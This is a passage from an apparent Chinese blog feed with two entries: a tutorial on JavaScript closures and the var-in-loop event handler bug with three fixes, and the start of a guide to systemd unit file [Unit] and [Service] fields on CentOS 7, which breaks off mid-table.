    <content><![CDATA[<h1 id="什么是闭包？"><a href="#什么是闭包？" class="headerlink" title="什么是闭包？"></a>什么是闭包？</h1><p>函数记住（记住就是指不被垃圾回收）并访问所在的词法作用域，叫做闭包现象，函数对作用域的引用就叫闭包。（个人理解：闭包就是函数与其所在的不被垃圾回收掉的词法作用域的引用关系）</p>
<h1 id="闭包的三个条件"><a href="#闭包的三个条件" class="headerlink" title="闭包的三个条件"></a>闭包的三个条件</h1><h2 id="一、可以访问其所在作用域的函数"><a href="#一、可以访问其所在作用域的函数" class="headerlink" title="一、可以访问其所在作用域的函数"></a>一、可以访问其所在作用域的函数</h2><p>即可以通过作用域链查找变量的函数</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> foo <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="二、有权访问另一个函数作用域中变量的函数"><a href="#二、有权访问另一个函数作用域中变量的函数" class="headerlink" title="二、有权访问另一个函数作用域中变量的函数"></a>二、有权访问另一个函数作用域中变量的函数</h2><p>即访问上层函数作用域的内层函数</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="三、在函数声明时的作用域以外的地方被调用的函数"><a href="#三、在函数声明时的作用域以外的地方被调用的函数" class="headerlink" title="三、在函数声明时的作用域以外的地方被调用的函数"></a>三、在函数声明时的作用域以外的地方被调用的函数</h2><p>即函数作为返回值或作为参数被传递</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 作为返回值</span>
<span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 作为参数传递</span>
<span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">baz</span><span class="token punctuation">(</span>bar<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function">baz</span><span class="token punctuation">(</span><span class="token parameter">fn</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<span id="more"></span>
<h2 id="闭包的作用"><a href="#闭包的作用" class="headerlink" title="闭包的作用"></a>闭包的作用</h2><p>闭包通常用来间接访问变量。即访问变量时还要隐藏变量，避免变量被全局变量污染。</p>
<h2 id="为什么要满足三个条件"><a href="#为什么要满足三个条件" class="headerlink" title="为什么要满足三个条件"></a>为什么要满足三个条件</h2><p>通过闭包的作用，来分析闭包满足三个条件的原因：</p>
<p>在ES6以前，javascript只有全局作用域和函数作用域，并没有块作用域的概念，故想要隐藏变量只能将变量放在局部作用域中，函数作用域就是唯一的局部作用域。函数嵌套中，外层函数提供了局部作用域，将要隐藏的变量放在其中。内层函数由于要对全局暴露，因此内层函数中不应声明要隐藏的变量，而内层函数还要能访问到局部作用域中的变量，因此就需要能够通过作用域链查找变量。内层函数对外暴露是最终目的，所以并非必须使用return和作为参数两种方法，只要能暴露给全局，任何方法都可以，例如对window对象赋值：window.fn = fn，使fn成为全局。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>严格上说，闭包应该同时满足以上三个条件：</p>
<ol>
<li>访问所在作用域（作用域链）</li>
<li>函数嵌套（内外层函数）</li>
<li>在所在作用域外被调用（return或作为参数）</li>
</ol>
<p>满足三个条件的意义：</p>
<ul>
<li>条件1和2的意义在于创建一个全局无法访问，但内层函数可以访问的局部作用域</li>
<li>条件3的意义是使内层函数暴露到全局，使得可以间接访问变量</li>
</ul>
<h1 id="闭包中常见的错误：在循环中创建闭包"><a href="#闭包中常见的错误：在循环中创建闭包" class="headerlink" title="闭包中常见的错误：在循环中创建闭包"></a>闭包中常见的错误：在循环中创建闭包</h1><p>在ES6引入let关键字前，在循环中创建闭包常会出现下面的问题：</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>help<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Helpful notes will appear here<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>E-mail: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Name: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Age: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>age<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>age<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">showHelp</span><span class="token punctuation">(</span><span class="token parameter">help</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'help'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> help<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">setupHelp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">var</span> helpText <span class="token operator">=</span> <span class="token punctuation">[</span>
      <span class="token punctuation">&#123;</span><span class="token string">'id'</span><span class="token operator">:</span> <span class="token string">'email'</span><span class="token punctuation">,</span> <span class="token string">'help'</span><span class="token operator">:</span> <span class="token string">'Your e-mail address'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
      <span class="token punctuation">&#123;</span><span class="token string">'id'</span><span class="token operator">:</span> <span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'help'</span><span class="token operator">:</span> <span class="token string">'Your full name'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
      <span class="token punctuation">&#123;</span><span class="token string">'id'</span><span class="token operator">:</span> <span class="token string">'age'</span><span class="token punctuation">,</span> <span class="token string">'help'</span><span class="token operator">:</span> <span class="token string">'Your age (you must be over 16)'</span><span class="token punctuation">&#125;</span>
    <span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> helpText<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> item <span class="token operator">=</span> helpText<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span>item<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onfocus</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token function">showHelp</span><span class="token punctuation">(</span>item<span class="token punctuation">.</span>help<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">setupHelp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在数组helpText中定义了三个帮助信息，每条信息都关联了一个html文件中input输入框的id，通过循环helpText，给每个input上添加了一个onfocus的事件处理函数，当光标聚焦到该输入框时，显示对应的帮助信息。</p>
<p>运行代码后发现并没有达到预期效果，光标聚焦在任何框都显示年龄的帮助信息。这是因为添加到onfocus的三个事件处理函数都共享了setupHelp的词法作用域，由于var关键字声明的变量没有块作用域且var声明的变量有提升机制，使得item变量也在setupHelp词法作用域中，故item变量也是被三个函数所共享，并没有分别绑定。当事件处理函数调用时，for循环已经执行完毕，item变量的值为helpText[2]，三个事件处理函数都是使用这个item值做为参数传入showHelp函数，就导致绑定了相同的帮助信息。</p>
<p>看到这里，我们就可以针对问题，给出解决方案了。</p>
<p>问题：事件处理函数共享上层词法作用域中的同一个变量</p>
<p>解决：为事件处理函数创建彼此独立的词法作用域，使之对应正确的变量</p>
<h2 id="解决方案一-多重函数闭包"><a href="#解决方案一-多重函数闭包" class="headerlink" title="解决方案一 多重函数闭包"></a>解决方案一 多重函数闭包</h2><p>在出问题的函数外再包裹一个函数并形成闭包，为事件处理函数新创建一层彼此独立的词法作用域。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">showHelp</span><span class="token punctuation">(</span><span class="token parameter">help</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"help"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> help<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function">makeHelpCallback</span><span class="token punctuation">(</span><span class="token parameter">help</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">//这里通过return的方式形成了匿名函数对makeHelpCallback作用域的闭包</span>
        <span class="token function">showHelp</span><span class="token punctuation">(</span>help<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function">setupHelp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> helpText <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token punctuation">&#123;</span><span class="token string">"id"</span><span class="token operator">:</span> <span class="token string">"email"</span><span class="token punctuation">,</span> <span class="token string">"help"</span><span class="token operator">:</span> <span class="token string">"Your e-mail address"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#123;</span><span class="token string">"id"</span><span class="token operator">:</span> <span class="token string">"name"</span><span class="token punctuation">,</span> <span class="token string">"help"</span><span class="token operator">:</span> <span class="token string">"Your full name"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#123;</span><span class="token string">"id"</span><span class="token operator">:</span> <span class="token string">"age"</span><span class="token punctuation">,</span> <span class="token string">"help"</span><span class="token operator">:</span> <span class="token string">"Your age (you must be over 16)"</span><span class="token punctuation">&#125;</span>
    <span class="token punctuation">]</span><span class="token punctuation">;</span>
  
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> helpText<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">var</span> item <span class="token operator">=</span> helpText<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span>item<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">.</span>onfocus <span class="token operator">=</span> <span class="token function">makeHelpCallback</span><span class="token punctuation">(</span>item<span class="token punctuation">.</span>help<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">setupHelp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>虽然setupHelp函数作用域中item的值仍然是固定的，但是在多重函数闭包后，增加了makeHelpCallback函数的作用域，正确的item.help在for循环时被当作makHelpCallback函数的参数，添加到了makeHelpCallback函数的作用域中，并通过闭包保留了下来。事件处理函数调用时，showHelp函数从makeHelpCallback函数的作用域中获得正确的item.help值做为参数，就可以绑定正确的帮助信息了。</p>
<h2 id="解决方案二-IIFE"><a href="#解决方案二-IIFE" class="headerlink" title="解决方案二 IIFE"></a>解决方案二 IIFE</h2><p>通过使用立即调用函数表达式，立即调用时封闭当前作用域，使每次for循环都形成一个独立的词法作用域，防止了var声明没有块作用域且有变量提升的特性。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">showHelp</span><span class="token punctuation">(</span><span class="token parameter">help</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"help"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> help<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function">setupHelp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> helpText <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token punctuation">&#123;</span><span class="token string">"id"</span><span class="token operator">:</span> <span class="token string">"email"</span><span class="token punctuation">,</span> <span class="token string">"help"</span><span class="token operator">:</span> <span class="token string">"Your e-mail address"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#123;</span><span class="token string">"id"</span><span class="token operator">:</span> <span class="token string">"name"</span><span class="token punctuation">,</span> <span class="token string">"help"</span><span class="token operator">:</span> <span class="token string">"Your full name"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#123;</span><span class="token string">"id"</span><span class="token operator">:</span> <span class="token string">"age"</span><span class="token punctuation">,</span> <span class="token string">"help"</span><span class="token operator">:</span> <span class="token string">"Your age (you must be over 16)"</span><span class="token punctuation">&#125;</span>
    <span class="token punctuation">]</span><span class="token punctuation">;</span>
  
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> helpText<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">var</span> item <span class="token operator">=</span> helpText<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
            document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span>item<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onfocus</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token function">showHelp</span><span class="token punctuation">(</span>item<span class="token punctuation">.</span>help<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
  
<span class="token function">setupHelp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>IIFE将每次for循环后的item变量分别封闭在三个IIFE的作用域中，item不再存在于三个函数共享的setupHelp作用域了。这样showhelp函数调用时以IIFE作用域中的item值为参数，也可以绑定正确的帮助信息。</p>
<h2 id="解决方案三-let"><a href="#解决方案三-let" class="headerlink" title="解决方案三 let"></a>解决方案三 let</h2><p>既然一切都是因为var没有块作用域且有变量提升机制造成的，那么我们使用ES6新增的关键字let就可以完美解决这个问题了。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">showHelp</span><span class="token punctuation">(</span><span class="token parameter">help</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"help"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> help<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function">setupHelp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> helpText <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token punctuation">&#123;</span><span class="token string">"id"</span><span class="token operator">:</span> <span class="token string">"email"</span><span class="token punctuation">,</span> <span class="token string">"help"</span><span class="token operator">:</span> <span class="token string">"Your e-mail address"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#123;</span><span class="token string">"id"</span><span class="token operator">:</span> <span class="token string">"name"</span><span class="token punctuation">,</span> <span class="token string">"help"</span><span class="token operator">:</span> <span class="token string">"Your full name"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#123;</span><span class="token string">"id"</span><span class="token operator">:</span> <span class="token string">"age"</span><span class="token punctuation">,</span> <span class="token string">"help"</span><span class="token operator">:</span> <span class="token string">"Your age (you must be over 16)"</span><span class="token punctuation">&#125;</span>
    <span class="token punctuation">]</span><span class="token punctuation">;</span>
  
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> helpText<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> item <span class="token operator">=</span> helpText<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span>item<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onfocus</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">showHelp</span><span class="token punctuation">(</span>item<span class="token punctuation">.</span>help<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
  
<span class="token function">setupHelp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>注意：ES6中块并不会创建新的执行环境和作用域，但代码运行到块时，会用块的词法作用域代替当前执行环境的词法作用域，直到块中代码运行完毕，再用原执行环境的词法作用域取代块的词法作用域。</p>
<p>因此用let声明item后，每次for循环都会创建一个独立的块作用域，事件处理函数调用时，虽然执行环境都是setupHelp执行环境，但块作用域是不同的，事件处理函数也会在彼此独立的块作用域中查找item变量做为参数，这样就实现了item.help的正确绑定。</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>闭包</tag>
      </tags>
  </entry>
  <entry>
    <title>linux系统systemctl配置与命令</title>
    <url>/2018/04/08/linux%E7%B3%BB%E7%BB%9Fsystemctl%E9%85%8D%E7%BD%AE%E4%B8%8E%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h1 id="systemctl配置文件"><a href="#systemctl配置文件" class="headerlink" title="systemctl配置文件"></a>systemctl配置文件</h1><p>CentOS 7的服务systemctl脚本存放在/usr/lib/systemd/目录下，/usr/lib/systemd/system目录下是不需要用户登陆，开机就能运行的服务脚本，/usr/lib/systemd/user目录下是用户登陆后才能运行的服务脚本。</p>
<p>服务脚本由以下三部分组成</p>
<h2 id="Unit-部份"><a href="#Unit-部份" class="headerlink" title="[Unit] 部份"></a>[Unit] 部份</h2><p>unit区块通常是配置文件的第一个区块，用来定义Unit的元数据，以及配置与其他Unit的关系。它的主要字段如下。</p>
<table>
<thead>
<tr>
<th>设置参数</th>
<th>参数意义说明</th>
</tr>
</thead>
<tbody><tr>
<td>Description</td>
<td>简易说明，用于使用时的输出说明和systemctl status的输出说明。</td>
</tr>
<tr>
<td>Documentation</td>
<td>文档地址，提供管理员进行进一步的文件查询的功能。</td>
</tr>
<tr>
<td>After</td>
<td>此unit是在哪个daemon启动之后才启动，仅说明服务启动的顺序，并没有强制要求里头的服务一定要启动后此 unit 才能启动。</td>
</tr>
<tr>
<td>Before</td>
<td>与After的意义相反，是在什么服务启动前启动这个服务。仅规范服务启动顺序，非强制要求。</td>
</tr>
<tr>
<td>Requires</td>
<td>定义与此unit相依赖的其他服务，如果在此项设置的依赖服务没有启动，那么此unit就不启动。</td>
</tr>
<tr>
<td>BindsTo</td>
<td>与Requires类似，定义与此unit相绑定的其他服务，若此项设置的绑定服务退出，则该unit也退出。</td>
</tr>
<tr>
<td>Wants</td>
<td>与该unit配合的其他服务，若其他服务未运行，该服务仍能启动。</td>
</tr>
<tr>
<td>Conflicts</td>
<td>与该unit冲突的服务，即冲突服务若已启动，该unit则不能启动。该unit已启动，则冲突服务就不能启动。</td>
</tr>
<tr>
<td>Condition…</td>
<td>当前 Unit 运行必须满足的条件，否则不会运行。</td>
</tr>
<tr>
<td>Assert…</td>
<td>当前 Unit 运行必须满足的条件，否则会报启动失败。</td>
</tr>
</tbody></table>
<span id="more"></span>
<h2 id="Service-部份"><a href="#Service-部份" class="headerlink" title="[Service] 部份"></a>[Service] 部份</h2><p>service区块用来定义Service的配置，只有Service类型的Unit才有这个区块。它的主要字段如下。</p>
<table>
<thead>
<tr>
<th>设置参数</th>
<th>参数意义说明</th>
</tr>
</thead>
<tbody><tr>
<td>Type</td>
<td>定义这个进程启动的方式，会影响ExecStart。有以下几种类型。simple：默认值，执行ExecStart的指令串，启动主进程，启动后常驻于内存中。forking：以fork方式从父进程创建子进程，创建后父进程会立即退出。传统的unit服务大多属于这种类型，例如httpd服务，当httpd的程序因为运行过久即将终结，则systemd会再重新生出另一个子程序继续运行后，再将父程序删除。oneshot：一次性进程，Systemd会等当前服务退出，再继续往下执行，不过这个程序在工作完毕后就结束了，不会常驻在内存中。dbus：与simple类似，当前服务通过D-Bus启动，即这个服务必须要在取得一个D-Bus的名称后，才能运行。因此设置这个项目时，通常也要设置BusName= 。idle：与simple类似，若其他服务执行完毕，当前服务才会运行。即这类的服务通常是开机到最后才执行的服务！ notify：当前服务启动完毕，会通知Systemd，再继续往下执行。</td>
</tr>
<tr>
<td>ExecStart</td>
<td>启动当前进程的指令或脚本程序。你也可以使用ExecStartPre（之前）以及ExecStartPost（之后）两个设置项目来在实际启动服务前（后），进行额外的指令行为。 但要特别注意的是，指令串仅接受“指令 参数 参数…”的格式，不能接受&lt;, &gt;, &gt;&gt;, &#124;, &amp;等特殊字符，很多的bash语法也不支持，故使用这些特殊的字符时，应直接写入到指令脚本中。</td>
</tr>
<tr>
<td>ExecStop</td>
<td>与systemctl stop的执行有关，关闭此服务时所执行的指令。</td>
</tr>
<tr>
<td>ExecReload</td>
<td>与systemctl reload有关的指令行为，重启当前服务时执行的命令。</td>
</tr>
<tr>
<td>Restart</td>
